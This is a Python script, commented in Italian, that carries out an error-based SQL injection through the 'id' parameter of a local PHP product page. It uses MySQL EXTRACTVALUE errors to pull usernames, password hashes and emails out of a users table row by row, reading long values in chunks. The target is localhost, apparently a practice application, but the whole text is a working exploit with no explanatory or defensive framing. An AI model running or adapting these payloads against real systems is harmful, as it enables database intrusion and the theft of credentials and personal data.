import requests
import re

s = requests.Session()
BASE_URL = 'http://localhost/Pizzafy/pizzafy/view_prod.php'

def extract(payload):
    """Invia il payload ed estrae il valore dall'errore XPATH"""
    r = s.get(BASE_URL, params={'id': payload})
    match = re.search(r"XPATH syntax error: '~(.+?)'", r.text)
    if match:
        return match.group(1)
    return None
'''''
def extract_long(payload_template, campo):
    """
    Gestisce valori lunghi >32 char usando SUBSTRING.
    Estrae a pezzi da 25 char e ricostruisce il valore completo.
    """
    result = ""
    offset = 1
    while True:
        p = payload_template.replace("__SUBSTR__", f"SUBSTRING({campo},{offset},25)")
        chunk = extract(p)
        if not chunk or chunk == result[-25:]:
            break
        result += chunk
        if len(chunk) < 25:
            break  # ultimo pezzo, stringa finita
        offset += 25
    return result if result else None
'''
# ============================================================
# Step 4 — Estrai i dati dalla tabella users
# ============================================================
print("=== DATI TABELLA: users ===\n")

for i in range(20):  # itera sulle righe
    # Estrai username
    p_user = f"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT username FROM users LIMIT 1 OFFSET {i})))-- -"
    username = extract(p_user)
    
    if not username:
        break  # nessun altro record
    
    # Estrai password (potrebbe essere hash MD5/bcrypt, quindi lunga)
    # Usa SUBSTRING per gestire valori >32 char
    password = ""
    for start in range(1, 200, 25):
        p_pass = f"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,{start},25) FROM users LIMIT 1 OFFSET {i})))-- -"
        chunk = extract(p_pass)
        if not chunk:
            break
        password += chunk
        if len(chunk) < 25:
            break

    # Estrai email
    p_email = f"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT email FROM users LIMIT 1 OFFSET {i})))-- -"
    email = extract(p_email)

    print(f"  Record [{i}]")
    print(f"    username : {username}")
    print(f"    password : {password}")
    print(f"    email    : {email}")
    print()